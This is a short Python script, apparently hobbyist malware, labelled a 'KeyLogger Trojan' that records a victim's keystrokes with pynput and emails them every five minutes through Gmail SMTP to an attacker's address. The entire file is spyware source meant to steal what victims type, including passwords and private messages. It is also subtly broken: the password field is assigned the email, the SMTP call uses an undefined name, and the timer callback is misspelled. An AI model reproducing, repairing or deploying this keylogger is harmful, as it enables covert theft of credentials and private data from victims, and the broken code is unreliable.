# KeyLogger Trojan

# logs a victim's keystrokes and sends 
# them to a hacker through a backdoor 
 
import pynput.keyboard
import threading
import smtplib

class KeyLogger:
    def __init__(self, em, pw):
        self.keylogs = ""
        self.email = em
        self.password = em
    # store each key into keylogs variable
    def processKeyListen(self, key):
        try: 
            currentKey = str(key.char)
        except AttributeError:
            if key == key.space: 
                currentKey = " "
            else: 
                currentKey = " " + str(key) + " " 
        self.keylogs = self.keylogs + currentKey
    # setup SMTP server. In this case, gmail. 
    def emailServer(self, msg):
        server = server.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(self.email, self.password)
        server.sendmail(self.email, self.email, msg)
        server.quit()
    # send keylogs
    def sendKeylogs(self):
        self.emailServer(self.keylogs)  
        self.keylogs = ""
        timer = threading.Timer(300, self.send-keylogs)
        timer.start()
    # start
    def start(self): 
        pynputListener = pynput.keyboard.Listener(on_press=self.processKeyListen)
        with pynputListener:
            # send key logs to hacker
            self.sendKeylogs()
            # print keys
            # self.printKeys()
            pynputListener.join()
# run keylogger
keylogger = KeyLogger("hacker@gmail.com", "bogusPassword")
keylogger.start()        